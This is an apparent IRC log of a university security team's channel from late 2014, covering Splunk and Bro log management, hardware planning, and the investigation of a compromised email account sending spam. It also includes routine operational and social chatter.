2014-10-22 13:58:35	jazoff	though 4 years is a long time :)
2014-10-22 14:01:42	eyrich	they have 12 slots for ram, we can do 12x8G for 96 or we could use 16G sticks, either 8 or 12
2014-10-22 14:01:44	eyrich	im thinking 8
2014-10-22 14:01:52	wraquel	jazoff: we can test on the auth test with sendmail
2014-10-22 14:02:05	jazoff	i see the right log lines now
2014-10-22 14:03:41	wraquel	jazoff: did you see Chris' email?
2014-10-22 14:03:51	wraquel	AUTH=server, relay=host-91-93-53-182.reverse.superonline.net [91.93.53.182] (may be forged), authid=jeffc@ncsa.uiuc.edu, mech=PLAIN, bits=0
2014-10-22 14:03:51	jazoff	yeah
2014-10-22 14:06:23	wraquel	I think the other method is more useful
2014-10-22 14:10:02	eyrich	jazoff: what do you think of 8 cluster+ manager , the cluster nodes would have 2x myricom cards
2014-10-22 14:10:56	eyrich	or would you rather have 4+1
2014-10-22 14:11:30	jazoff	8+1 is more future proof, but i don't think we need it now
2014-10-22 14:11:36	jazoff	the dev cluster seems to be working ok with 4
2014-10-22 14:11:47	eyrich	for 4 years
2014-10-22 14:11:48	eyrich	?
2014-10-22 14:12:36	jazoff	hard to say
2014-10-22 14:12:46	jazoff	who knows what different applications may be runnign 3 years from now
2014-10-22 14:13:06	eyrich	yes - but we only get chance to buy money once
2014-10-22 14:13:20	jazoff	well it won't hurt to have 8
2014-10-22 14:13:25	eyrich	ok
2014-10-22 14:30:02	jazoff	ah, i think I am using the wrong value in the smtp policy
2014-10-22 14:30:14	wraquel	uh oh.
2014-10-22 14:30:26	jazoff	(num vs. unique)
2014-10-22 14:30:29	wraquel	ANy issues with the hosts youBHRd?
2014-10-22 14:30:32	jazoff	that's why  <owner-security-alerts@ncsa.uiuc.edu> alerted
2014-10-22 14:30:33	wraquel	ah
2014-10-22 14:30:40	jazoff	nooo that was just based on the data in splunk
2014-10-22 14:59:08	wraquel	jazoff: can you check for kerb failures for jeffc prior to oct 15.
2014-10-22 14:59:32	wraquel	I think those would be coming from brick.
2014-10-22 15:04:17	jazoff	doesn't look like it
2014-10-22 15:04:45	jazoff	oh, the syslog index in splunk only goes back 10 days
2014-10-22 15:13:49	jazoff	running a grep on lowp, will take a while
2014-10-22 15:14:11	jazoff	going for a walk with dog, should be done when I get back
2014-10-22 15:31:44	jazoff	up to 10/11
2014-10-22 15:32:47	jazoff	doesn't look like there were many failures, just these 2 messages taht I see:
2014-10-22 15:32:50	jazoff	Oct  8 10:06:42 ldap.ncsa.illinois.edu ns-slapd: pam_krb5(ldapserver:auth): authentication failure; logname=jeffc uid=99 euid=99 tty= ruser= rhost=
2014-10-22 15:32:54	jazoff	Oct  8 10:06:42 ldap.ncsa.illinois.edu ns-slapd: pam_krb5(ldapserver:auth): authentication failure; logname=jeffc uid=99 euid=99 tty= ruser= rhost=
2014-10-23 09:09:57	wraquel	jazoff: only 10 days?
2014-10-23 09:13:25	jazoff	it's allocated 20G
2014-10-23 09:13:38	wraquel	that seems small
2014-10-23 09:13:48	wraquel	We'll fix that on the upgrade
2014-10-23 09:14:01	jazoff	could give it some more, but not much
2014-10-23 09:14:02	jazoff	yeah
2014-10-23 09:18:32	wraquel	As long as it's on lowp.
2014-10-23 09:18:37	wraquel	Or syslog-sec
2014-10-23 09:18:45	wraquel	seclogs? yeah, seclogs
2014-10-23 09:23:11	wraquel	jazoff: thoughts on the most elegant way to determine if a python cli argument is a directory, file or blob?
2014-10-23 09:23:49	jazoff	blob?
2014-10-23 09:24:13	wraquel	glob
2014-10-23 09:24:29	wraquel	my bad
2014-10-23 09:26:13	wraquel	I guess just passing it to glob and evaluating each item.
2014-10-23 09:29:44	jazoff	well generally the shell expands globs
2014-10-23 09:29:47	jazoff	unless you quote it
2014-10-23 09:29:51	wraquel	right
2014-10-23 09:29:57	jazoff	python never sees it
2014-10-23 09:30:23	jazoff	but for the rest, import os and use os.path.isdir or os.path.isfile
2014-10-23 09:33:11	wraquel	that works
2014-10-23 09:47:43	jazoff	you see that KnownBad::Known_Bad_Downloads just now?
2014-10-23 09:47:50	jazoff	from Sanitize.php ?
2014-10-23 09:48:49	 *	wraquel virtualy kicks at Exchange....
2014-10-23 09:48:53	jazoff	well, from a few hours ago
2014-10-23 09:50:01	jazoff	ah, looks like they ftp'd an entire site
2014-10-23 09:50:51	jazoff	that site is www.magiclamp.org apparently
2014-10-23 09:51:16	jazoff	wtf is that
2014-10-23 09:52:23	jazoff	it's srp, whoever that is
2014-10-23 09:52:29	jazoff	seems to use the same username on the server as at ncsa
2014-10-23 09:52:47	jazoff	think they use the same password over plaintext ftp that they do for ssh? :)
2014-10-23 12:00:27	jazoff	also, I added a saved search for the smtp authentications to the gulp index thing, so now the auth history includes sendmail..
2014-10-23 12:00:32	jazoff	https://portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single/jeffc
2014-10-23 12:21:26	jazoff	soehlert: how often should seclogs sync to lowp?
2014-10-23 12:21:46	jazoff	[jazoff@lowp ~]$ ls /data/syslogs/seclogs/2014/10
2014-10-23 12:21:47	jazoff	01  02  03  04  05  06  07  08  09  10  11  12  13  14  15  16  17  18  19  20
2014-10-23 12:23:18	jazoff	i think the jeffc account was compromised a while ago..
2014-10-23 12:23:19	jazoff	Sep 10 17:14:58 rimantadine sendmail[19027]: AUTH=server, relay=[41.250.110.45], authid=jeffc@ncsa.uiuc.edu, mech=LOGIN, bits=0
2014-10-23 12:23:47	jazoff	need to re-run the search in aug or older now
2014-10-23 12:24:00	wraquel	great...
2014-10-23 12:26:47	jazoff	yeah, this problem is pretty obvious now that I know where to look
2014-10-23 12:26:55	jazoff	index=gulp sendmail NOT srcip=72.36.0.0/16 NOT srcip=10.0.0.0/8 NOT srcip=141.142.0.0/16 | stats dc(srcip) as sources by user  | sort -sources
2014-10-23 12:27:07	jazoff	jeffc = 515 ips in the last 30 days, next highest user: 3
2014-10-23 12:29:36	wraquel	I'm wondering how many users actually use the mail server anyway.
2014-10-23 12:29:40	wraquel	for authsmtp
2014-10-23 12:35:31	jazoff	10
2014-10-23 12:37:22	wraquel	need to look for ssh auths for jeffc in NCSA>
2014-10-23 12:37:31	wraquel	like public linux or something. just in case.
2014-10-23 12:37:49	jazoff	none recently
2014-10-23 12:37:57	wraquel	gulp?
2014-10-23 12:38:01	jazoff	i'm grepping allt he archived logs for jeffc for further processing
2014-10-23 12:38:02	jazoff	yeah
2014-10-23 12:38:04	jazoff	index=gulp jeffc | top service
2014-10-23 12:38:09	wraquel	cool
2014-10-23 12:38:31	jazoff	the gulp index actually goes back a ways
2014-10-23 12:39:32	jazoff	there are some ssh logins
2014-10-23 12:40:07	jazoff	can do a 'index=gulp jeffc ssh' for the year to date
2014-10-23 12:40:45	jazoff	source ips are all local though
2014-10-23 12:55:51	jazoff	wraquel: they don't appear to have cleared the smtp queue
2014-10-23 13:00:20	wraquel	sigh
2014-10-23 13:00:27	wraquel	It's Chris Lindsey....
2014-10-23 13:14:53	jazoff	looks like the outbound spam started around 9/25
2014-10-23 13:15:02	jazoff	and definitely by 9/29
2014-10-23 13:15:07	jazoff	er, 9/28
2014-10-23 13:31:07	jazoff	do we know what jeffc's ncsa ip address is?
2014-10-23 13:41:12	wraquel	hmm
2014-10-23 13:41:16	wraquel	nope
2014-10-23 14:48:58	wraquel	looks like the queue may have been flushed.
2014-10-24 08:56:20	wraquel	I forgot, if you have incident info regarding jeffc, can you throw it into the git repo for incidents?
2014-10-24 08:56:44	jazoff	yes
2014-10-24 08:56:50	jazoff	need to organize it a bit
2014-10-24 09:07:46	wraquel	danke
2014-10-24 09:37:05	wraquel	what is shark.ncsa.illinois.edu?
2014-10-24 09:37:46	wraquel	oh. I think it's lsst related.
2014-10-24 09:37:52	jazoff	mfreemon
2014-10-24 09:38:03	jazoff	yeah.. https://portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single/141.142.21.16
2014-10-24 09:38:15	jazoff	all the logins are from lsst-* hosts
2014-10-24 10:31:49	eyrich	jazoff: i need a graph/table of daily traffic amounts for clients pulling data from crl.cilogon.org OR crl.ncsa.illinois.edu, cover all of aug,sept,oct
2014-10-24 10:32:02	eyrich	is this doable in splunk?
2014-10-24 10:32:22	jazoff	it would be if the data went back that far
2014-10-24 10:32:42	jazoff	i can write a quick python prog to do that across the raw logs on lowp
2014-10-24 10:33:19	eyrich	how far back does the data go?
2014-10-24 10:33:28	jazoff	only a few weeks for the bulk stuff like http
2014-10-24 10:33:34	jazoff	one thing I can maybe do...
2014-10-24 10:33:44	jazoff	fgrep the raw data out of lowp and load it into splunk
2014-10-24 10:33:47	jazoff	then we can play around with that subset
2014-10-24 10:33:57	jazoff	should only be a few megs
2014-10-24 10:34:09	eyrich	sounds good, 
2014-10-24 10:34:20	jazoff	i THINK it will grab the right dates :)
2014-10-24 10:34:35	eyrich	we need to see if we qualify for the free CloudFlare tier
2014-10-24 10:34:38	jazoff	i can always pipe to bro-cut -d first
2014-10-24 10:34:54	jazoff	or just write it in python.. should only be  a few lines
2014-10-24 10:48:45	jazoff	is sam around?
2014-10-24 10:48:53	jazoff	i still see data not showing up on lowp
2014-10-24 10:48:58	jazoff	[jazoff@lowp syslogs]$ ls seclogs//2014/10
2014-10-24 10:48:58	jazoff	01  03  05  07  09  11  13  15  17  19  21
2014-10-24 10:48:58	jazoff	02  04  06  08  10  12  14  16  18  20
2014-10-24 10:49:51	wraquel	jazoff: soehlert is working from home
2014-10-24 11:03:01	eyrich	does dumbno use 4 tuples?
2014-10-24 11:03:21	jazoff	yes
2014-10-24 11:03:30	jazoff	it can do 2 tuple, or 5 actually
2014-10-24 11:03:38	jazoff	ip for src/dst or proto+src/dst/sport/dport
2014-10-24 11:04:09	eyrich	we blocked on ingress on the 7150?
2014-10-24 11:05:23	jazoff	ummm
2014-10-24 11:06:08	jazoff	yeah, you had to
2014-10-24 11:11:28	jazoff	ok, program written
2014-10-24 11:11:40	jazoff	will output day + bytes for the last 3 months
2014-10-24 11:11:48	eyrich	nice
2014-10-24 11:12:24	jazoff	i need to see if i can write a bro input reader for spark SQL
2014-10-24 11:12:35	jazoff	it's that hadoop/hive replacement thing
2014-10-24 11:12:48	jazoff	it works pretty well against bro json logs, but those are a bit bigger
2014-10-24 11:13:01	jazoff	if that worked, this whole thing would just be a sql query against the arhived bro logs
2014-10-24 11:22:01	jazoff	sent
2014-10-24 11:22:18	jazoff	i should eat something and walk the dog.. be back soon
2014-10-24 14:18:05	wraquel	jschipp: found another office exercise thing you can use: http://www.cnet.com/news/hamster-wheel-standing-desk-embrace-the-rodent-race/
2014-10-24 15:53:48	jazoff	looks like 141.142.41.28 just installed conduit
2014-10-24 15:54:19	jazoff	or rather, a few hours ago
2014-10-24 15:56:21	jazoff	oh no, was right, just now
2014-10-24 15:56:31	jazoff	stupid mac mail app still things it's on PDT
2014-10-27 09:45:57	wraquel	jazoff: next time those should go to help+its@ncsa.illinois.edu
2014-10-27 09:50:30	jazoff	ok :)
2014-10-27 09:50:52	jazoff	at least it went better this time, last time they assigned it back to us
2014-10-27 09:51:02	wraquel	Did it actually get picked up?
2014-10-27 09:56:19	jazoff	yeah.. it was closed pretty quickly
2014-10-27 09:56:52	jazoff	ah, he just wrote to me directly...
2014-10-27 09:57:16	jazoff	1) Installed Win8_64 on system that was experiencing some hardware difficulties.
2014-10-27 09:57:19	jazoff	2) Installed stress test for Win8.1 from internet. Adware must have been included.
2014-10-27 09:57:22	jazoff	3) Wiped system and reinstalled Win8_64.
2014-10-27 09:57:24	jazoff	4) Thank you for the notification.
2014-10-27 09:58:47	wraquel	wtw.
2014-10-27 11:59:59	jschipp	jazoff: could you leverage a Jenkins server for anything? Thinking that it might be useful to test things in our Git repos
2014-10-27 12:00:38	jschipp	For me, it might be a better way to check syntax of Nagios configs
2014-10-27 12:05:40	jazoff	not really
2014-10-27 12:15:05	jazoff	stupid lastpass..
2014-10-27 12:15:38	jazoff	bit me again by losing a newly generated password because it saved the old one instead
2014-10-27 12:18:04	soehlert	oof i hate that
2014-10-27 12:20:25	jazoff	so, no ethics training for me today
2014-10-27 12:21:33	soehlert	it could be worse. im still sitting in the waiting room here and just realized i stepped in dog poop earlier. It smells awful and I have no tool to get it out of my shoes..
2014-10-27 12:22:31	jazoff	fold a plain peice of paper and use the resulting V to scoop it out
2014-10-27 12:22:49	jazoff	or find a postcard from a magazine, that would work better
2014-10-27 12:25:18	soehlert	unfortunately it's hardened. i need like a chopstick or a stick i tried the magazine and it failed to do much of anything
2014-10-27 12:42:49	wraquel	DOesn't lastpass generate a new line that's calle d'generated for web' or something like that?
2014-10-27 13:11:39	jazoff	i dunno, i couldn't find it anywhere
2014-10-27 13:11:54	jazoff	the only password I saw was the temporary one that I used once
2014-10-27 13:12:16	jazoff	i think there is some sequence of clicks that you can do that screws things up
2014-10-27 14:04:41	soehlert	i've done it before too
2014-10-27 14:04:46	soehlert	eyrich: http://securityreactions.tumblr.com/post/101100368062/when-my-client-shows-me-the-qualys-report-stating
2014-10-27 14:26:51	jazoff	works the other way too :)
2014-10-27 14:28:29	soehlert	other way?
2014-10-27 14:29:10	jazoff	"the report says everything is vulnerable"
2014-10-27 14:30:33	soehlert	ahhh gotcha. ya unfortunately that one is more likely it seems
2014-10-27 15:00:35	soehlert	ugh finally just getting home. looks like the new seclogs is ready to go (finally) so I'm gonna go to PCF and make that switch.
2014-10-27 15:02:10	jazoff	oh, speaking of logs
2014-10-27 15:02:24	wraquel	forgot to eat?
2014-10-27 15:02:32	jazoff	why does it looks like logs only show up on lowp after 3 days.. is that how the archive script works?
2014-10-27 15:02:46	jazoff	any reason it cant archive asap and then delete later?
2014-10-27 15:03:04	soehlert	actually if i remember correctly, you were the one with that request
2014-10-27 15:03:11	soehlert	i have no reason to keep them three days locally
2014-10-27 15:07:03	soehlert	we can work on that (and getting the compressed per host vs compressed dir of them) later. 
2014-10-27 15:12:40	jazoff	ah :)
2014-10-27 16:08:09	soehlert	jschipp: there is no longer a seclogs at 141.142.148.43 so you can remove that one from the relays
2014-10-27 16:10:19	jschipp	soehlert: kk
2014-10-27 16:11:14	jschipp	that explains why they're bufering
2014-10-27 16:12:09	soehlert	oops didnt think of that when i went to make the switch
2014-10-27 16:13:12	jschipp	nbd, should be fixed in a jiffy
2014-10-27 16:28:39	soehlert	what's the sysctl stuff about?
2014-10-28 10:19:57	soehlert	jazoff: did you ever figure out which flows machine is having issues with topN?
2014-10-28 10:31:46	jazoff	oh, no
2014-10-28 10:31:54	jazoff	is that still erroring out?
2014-10-28 10:32:01	jazoff	i think I don't even get those emails for some reason
2014-10-28 10:32:17	jazoff	am I not on a mailing list I should be on?
2014-10-28 10:32:21	soehlert	actually looking at that, one is just empty
2014-10-28 10:32:34	soehlert	it goes to security-admin...you might not be on that one
2014-10-28 10:32:49	soehlert	so ya one of them stopped erroring but it is empty
2014-10-28 10:33:07	soehlert	the non empty one also has this: /home/secops/tt_report/python_env/lib/python2.6/site-packages/requests/packages/urllib3/connectionpool.py:730: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.org/en/latest/security.html (This warning will only appear once by default.)
2014-10-28 10:33:07	soehlert	  InsecureRequestWarning)
2014-10-28 10:35:27	jazoff	ah, well the empty one is likely from the old box that can be shut down
2014-10-28 10:37:05	soehlert	ok thats kinda what i was figuring at this point
2014-10-28 10:37:42	soehlert	i shut down the old one
2014-10-28 10:40:40	jazoff	no flows = no top talkers :)
2014-10-28 10:50:27	soehlert	crazy how that works
2014-10-28 12:52:00	soehlert	where did the excessive recipients thing come from?
2014-10-28 12:55:07	jazoff	new bro policy to detect spam
2014-10-28 12:55:21	jazoff	need to fix to filter out spam that is forwarded to external email
2014-10-28 12:57:58	soehlert	gotcha. whats the playbook on handling those alerts?
2014-10-28 12:58:36	jazoff	search your recent mail for johnc
2014-10-28 12:59:01	jazoff	i think we complain to the guy that runs the mailserver like warren did
2014-10-28 13:07:13	soehlert	ah ok
2014-10-28 13:10:18	wraquel	:D
2014-10-28 13:16:22	jazoff	neat.. there is no longer a vacant house on my street
2014-10-28 13:28:50	soehlert	ahh no more parties then..
2014-10-28 13:30:53	jazoff	well, no more house :)
2014-10-28 13:37:15	wraquel	jazoff: hey, that's right downtown from you https://www.techdirt.com/articles/20130923/04074424621/cosplayer-sued-carpet-company-because-lawyers.shtml
2014-10-28 13:38:23	jazoff	indeed
2014-10-28 15:45:17	soehlert	wraquel and jazoff: you guys gotta work to get jazoff a bw account so he can be added to the bw_secops LDAP group
2014-10-28 15:55:14	jschipp	CentOS 6.6 is out: http://lwn.net/Articles/618331/
2014-10-28 16:08:28	jazoff	i don't have a bw account?
2014-10-28 23:51:30	wraquel	jazoff: huh. I thought he did.
2014-10-28 23:52:41	wraquel	alright, will tackle this in the morning. Leaving this here as a reminder: https://bluewaters.ncsa.illinois.edu/faq
2014-10-29 09:02:32	wraquel	wtf is this? co.marketmaker.uiuc.edu
2014-10-29 09:07:32	jazoff	co.marketmaker.uiuc.edu is an alias for redirect.ncsa.illinois.edu.
2014-10-29 09:08:11	wraquel	yeah, then it redirects you to a marketing site
2014-10-29 09:08:14	wraquel	for pills I think
2014-10-29 09:08:17	wraquel	Seems odd.
2014-10-29 09:08:42	jazoff	intersting that marketmaker.uiuc.edu has address 128.174.122.21
2014-10-29 09:09:09	wraquel	redirect is a vhost too. The IP points to the main web server for NCSA I think
2014-10-29 09:09:29	jazoff	http://web.archive.org/web/20090814191515/http://co.marketmaker.uiuc.edu/
2014-10-29 09:10:07	jazoff	http://web.archive.org/web/20121218115340/http://co.marketmaker.uiuc.edu/
2014-10-29 09:10:35	jazoff	up to http://web.archive.org/web/20140108210338/http://co.marketmaker.uiuc.edu/
2014-10-29 09:11:06	jazoff	the footer says ' Copyright  2013, The Board of Trustees of the University of Illinois. All rights reserved. (version: 3.7.5) '
2014-10-29 09:11:17	jazoff	so it used to be related somehow
2014-10-29 09:15:20	wraquel	MarketMaker was created at the University of Illinois at Urbana-Champaign in 2004 and is licensed to Riverside Research
2014-10-29 09:15:48	wraquel	there you go.
2014-10-29 09:16:47	wraquel	bro_http_inbound does not appear to also include the redirect address.
2014-10-29 09:16:54	wraquel	Is it somewhere else?
2014-10-29 09:17:15	jazoff	the redirect address?
2014-10-29 09:17:32	wraquel	the 303 redirect
2014-10-29 09:17:38	wraquel	er 30x
2014-10-29 09:18:37	wraquel	shouldn't it record the location of the redirect?
2014-10-29 09:19:04	wraquel	interesting UA Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
2014-10-29 09:20:00	wraquel	Does bro have something for detecting web spiders?
2014-10-29 09:20:12	jazoff	no
2014-10-29 09:20:19	wraquel	sounds like a fun project then.
2014-10-29 09:20:24	jazoff	other than that the UA is logged and you could find them easy enough
2014-10-29 09:21:17	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Ping timeout)
2014-10-29 09:21:32	wraquel	I mean, even if they are faking their UA.
2014-10-29 09:22:53	jazoff	ah
2014-10-29 09:24:40	wraquel	so, does bro have the redirect location and it's not enabled or it just doesn't?
2014-10-29 09:24:59	wraquel	Seems like it should be trivial to pull out
2014-10-29 09:28:28	wraquel	Kippos is basically useless right now. We should move it to the Dow space or something.
2014-10-29 09:28:50	wraquel	-s
2014-10-29 10:04:51	soehlert	whys that?
2014-10-29 10:09:13	wraquel	I think the report is zed every day.
2014-10-29 10:11:04	wraquel	At least the last few times I checked it's null.
2014-10-29 10:13:28	wraquel	looks like I don't have the ability to add anyone to the team.
2014-10-29 10:13:35	wraquel	I think brett's gonna have to do that.
2014-10-29 10:14:00	wraquel	And by Team, it looks like it's all of NCSA BW, not just secops.
2014-10-29 10:14:25	wraquel	I'll send the request
2014-10-29 10:16:07	soehlert	Yes you can't do it, but the request has to come from a manager
2014-10-29 10:17:28	wraquel	sent
2014-10-29 10:18:14	wraquel	Maybe I'm looking on the wrong page
2014-10-29 10:20:29	wraquel	jazoff: did you update the security-incident repo?
2014-10-29 10:21:20	jazoff	oh, no
2014-10-29 10:21:25	jazoff	for the jeffc thing?
2014-10-29 10:21:50	jazoff	ive been trying to finish up on the bhr site for tomorrows call
2014-10-29 10:22:05	wraquel	ah
2014-10-29 10:22:41	wraquel	It doesn't need to be terribly tidy, as long as the info is in there
2014-10-29 10:23:01	jazoff	yeah. i have the logs files in various places, just need to aggregate them
2014-10-29 10:23:28	soehlert	https://twitter.com/iamdevloper/status/527409281512255489 entirely too true
2014-10-29 10:23:32	jazoff	and I think re-ru one of the greps that missed some of the newest log entries due to the rotation
2014-10-29 10:26:26	jazoff	BW uses a different RSA token than NCSA?
2014-10-29 10:30:41	jazoff	pretty sure i can already login to bwbh1 using the token i have
2014-10-29 10:40:53	soehlert	no it doesnt, but you dont have an actual bw account
2014-10-29 10:41:04	soehlert	you have a bastion host account because we run those
2014-10-29 10:41:04	soehlert	but bw LDAP doesn't know you exist
2014-10-29 10:41:56	wraquel	brett says the account has been requested.
2014-10-29 10:43:11	jazoff	yeah, i got an email and filled out the form
2014-10-29 10:55:23	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-10-29 13:05:12	--	irc: disconnected from server
2014-10-29 13:05:23	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-10-29 13:05:23	--	Channel #security: 6 nicks (0 ops, 0 halfops, 0 voices, 6 normals)
2014-10-29 13:05:35	--	Mode #security [+]
2014-10-29 13:05:35	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-10-29 14:03:20	eyrich	meeting?
2014-10-29 14:04:25	jschipp	pushed back to 3
2014-10-29 14:07:44	eyrich	ah, ok, i will have to call in then. gotta go
2014-10-29 14:09:14	soehlert	oh i didnt need to wait that long. 
2014-10-29 14:09:14	soehlert	i was thinking like 20 minutes
2014-10-29 14:09:23	wraquel	ah
2014-10-29 14:09:26	 *	soehlert crosses fingers i didnt just jinx things
2014-10-29 14:09:31	wraquel	meh
2014-10-29 14:10:16	wraquel	I actually have some materials I'm going through. I don't mind punting for this week unless there's something pressing to discuss
2014-10-29 14:13:34	soehlert	i dont have much to report. seclogs is now centosized. been putting out fires and dealing with little crap mostly. once i get my laptop back ill be able to dive into more package building for puppet which will move along the centos stuff
2014-10-29 14:14:52	jazoff	and bro, still need to do bro
2014-10-29 14:15:27	soehlert	yes i know. this laptop death has really made getting back into the swing of things difficult. not to mention stuff piling up from vacation. that's definitely high up my list
2014-10-29 14:15:39	soehlert	are we all set with licenses and whatnot?
2014-10-29 14:20:36	jazoff	yeah, we are just going to use the v2 licenses already programmed into the cards
2014-10-29 14:21:10	jazoff	speaking of vacation, I'm off friday and monday.. music thing in NOLA i bought tickets for a few months ago
2014-10-29 14:21:33	jazoff	good thing they were for the GF and she remembers stuff like this, I had forgotten all about it
2014-10-29 14:23:24	wraquel	Yeah, re: licenses. We're going to upgrade to v3 when we get the new cluster systems in.
2014-10-29 14:24:53	soehlert	perfect
2014-10-29 14:24:53	soehlert	jazoff: what music thing?
2014-10-29 14:28:27	jazoff	http://worshipthemusic.com/artists/
2014-10-29 14:31:05	soehlert	thats a strange group. who you going to see?
2014-10-29 14:37:36	jazoff	mostly FF, 30 seconds to mars
2014-10-29 14:37:48	jazoff	it's 3 days. so hopefully get to see a lot
2014-10-29 14:40:10	jazoff	https://www.drupal.org/PSA-2014-003
2014-10-29 14:40:11	jazoff	fun
2014-10-29 14:44:26	jazoff	just php being stupid
2014-10-29 14:44:37	jazoff	" The Problem occurs, if the array has keys, which are no integers. Example:"
2014-10-29 14:44:50	jazoff	because php doesnt have separate data types for arrays and hash tables
2014-10-29 14:48:25	jazoff	i think the site here is too old to have that problem?
2014-10-29 14:50:13	jazoff	http://snuffy.ncsa.illinois.edu/drupal/CHANGELOG.txt is helpful :)
2014-10-29 14:51:29	soehlert	sweet sounds fun. to both the FF/30secs and PHP stuff...
2014-10-29 15:39:08	jazoff	odd.. getting texts from.. someone telling security to call jeremy enos
2014-10-29 15:39:47	jschipp	me too
2014-10-29 15:39:48	jschipp	war
2014-10-29 15:39:56	jschipp	wraquel: 
2014-10-29 15:40:24	jazoff	i tried calling, got voicemail
2014-10-29 15:44:11	jazoff	got through, apparently eyrich is working on it
2014-10-29 15:44:23	jazoff	i guess 3 of us called him :)
2014-10-29 15:49:41	wraquel	I was on the phone with him but was cutting out.
2014-10-29 15:49:59	wraquel	That would be the NCSA help desk
2014-10-29 16:01:18	jazoff	ah.. so we get paged apparently?
2014-10-29 16:01:34	jazoff	i guess it makes it tricky to tell who is responding if everyone getgs it
2014-10-30 09:53:42	soehlert	jazoff: well not everyone got it so there's that. i had no texts
2014-10-31 06:45:43	jazoff	ok, off for NOLA, see you monday night/tuesday
2014-10-31 08:49:43	wraquel	safe travels.
2014-10-31 09:24:02	wraquel	uh... https://cyclone.ncsa.illinois.edu:8000/en-US/app/search/flashtimeline?q=search%20sourcetype%3Dbro_irc&earliest=-7d%40h&latest=now
2014-10-31 09:27:02	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2014-10-31 09:27:13	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-10-31 09:35:42	wraquel	looks like the nfdump lookup on lowp:8000 doesn't work
2014-10-31 09:39:14	wraquel	and can't ssh into flows-sec
2014-10-31 09:39:22	wraquel	[wraquel@fog ~]$ kinit
2014-10-31 09:39:22	wraquel	Password for wraquel@NCSA.EDU:
2014-10-31 09:39:22	wraquel	[wraquel@fog ~]$ ssh flows-sec
2014-10-31 09:39:23	wraquel	Permission denied (gssapi-keyex,gssapi-with-mic).
2014-10-31 10:14:30	soehlert	working on it
2014-10-31 10:17:40	soehlert	wraquel: use the fqdn. trying to figure out why fog is attempting to ssh to the private interface (which is not in kerberos)
2014-10-31 10:27:03	wraquel	thnx. that works
2014-10-31 14:01:42	soehlert	ugh jesus that was a long and twisted world of sshd. flows-sec should finally work properly.
2014-10-31 16:23:40	eyrich	soehlert: step out and see Enos
2014-11-03 11:25:38	wraquel	campus has their splunk license finally. We can get one as soon as we're ready. What's the status of the new 6.x cluster?
2014-11-03 11:36:29	soehlert	it was toward the bottom of the list of priority since we didn't have a good license.
2014-11-03 11:36:43	soehlert	did we decide if thats all hw or one is hw and something else is a vm?
2014-11-03 11:36:57	eyrich	all HW i thought
2014-11-03 11:37:34	eyrich	unless there was more then 2 maybe? something about HW for data and VM for querier
2014-11-03 11:37:56	soehlert	ok thats what i had in my head too. 2 hw nodes and then a vm search node
2014-11-03 11:42:40	wraquel	It was 2 HW nodes for indexing, and 2 VM nodes. 1 for a search head and one for... soemthing else
2014-11-03 11:44:27	soehlert	ok i can get those made up today, just waiting for jazoff to do his thing on them.
2014-11-03 11:45:10	wraquel	He's at the music thing today
2014-11-03 11:45:52	soehlert	yup i know. thats why i'll give him some blank slates tomorrow. 
2014-11-03 12:56:19	jschipp	I need to store 200GB+ of PCAPs and memory images in the cloud and mountable via nfs for ISLET systems, looking for something free or inexpensive. If you have any ideas let me know
2014-11-03 13:50:02	wraquel	work related or not?
2014-11-03 14:20:40	jschipp	not, I want to provide people deploying ISLET ready made exercises for NSM images because collecting this stuff is a lot of work
2014-11-03 14:21:33	jschipp	unless it would be useful for us to have a place for us to store these things for testing tools, etc.
2014-11-03 14:22:00	jschipp	I definitely see use for it and NCSA has the ability to store it
2014-11-03 14:22:09	jschipp	but that's different matter
2014-11-03 15:23:33	wraquel	jschipp: what's up with cif?
2014-11-03 15:23:36	wraquel	And the emails?
2014-11-03 15:24:07	jschipp	not sure yet
2014-11-03 15:24:40	jschipp	it's not supposed to send mail AFAIK
2014-11-03 15:25:06	jschipp	might be a crontab
2014-11-03 15:25:56	wraquel	actaully
2014-11-03 15:26:17	wraquel	it looks like something is trying to email TO cif@cif.ncsa.illinois.edu
2014-11-03 15:38:12	jschipp	not quite, cif is sending the mail
2014-11-03 15:38:13	jschipp	awk '$3 == "141.142.148.42" && $6 == 53' conn.log | wc -l
2014-11-03 15:38:13	jschipp	34657
2014-11-03 15:38:44	jschipp	to itself I'm guessing for now
2014-11-03 15:38:58	wraquel	why the loop in the mail system though?
2014-11-03 15:39:25	wraquel	53 is dns.
2014-11-03 15:39:27	jschipp	err, should have been 25
2014-11-03 15:39:32	wraquel	lol
2014-11-03 15:39:55	jschipp	pasted the wrong one
2014-11-03 15:39:57	jschipp	47 for smtp 
2014-11-03 15:40:08	wraquel	25?
2014-11-03 15:40:13	wraquel	or 587
2014-11-03 15:40:29	jschipp	47 smtp messages sent
2014-11-03 15:41:53	wraquel	Doesn't docker have some kind of repo?
2014-11-03 15:42:31	jschipp	hub.docker.com
2014-11-03 15:42:57	wraquel	hub.islet.org
2014-11-03 15:43:07	wraquel	ust a thought
2014-11-03 15:43:09	wraquel	j
2014-11-03 15:43:56	jschipp	those are to store Docker images, which are usually less than 1Gb
2014-11-03 15:44:33	jschipp	I've thought about doing a private repository for Docker
2014-11-03 15:44:44	jschipp	errr, I mean run my own
2014-11-03 15:46:53	wraquel	looks like liam just gave OpenNSM a nice little shove.
2014-11-03 15:47:02	wraquel	https://twitter.com/Hectaman/status/529378383613136896
2014-11-03 15:47:45	jschipp	:) yep, and Beijtlich joined the list :) :)
2014-11-03 15:53:27	soehlert	thoughts on naming scheme for splunk machines? splunk-sec? splunk-index1-sec splunk-index2-sec?
2014-11-03 15:55:56	jschipp	how many machines?
2014-11-03 15:57:06	wraquel	Not too long?
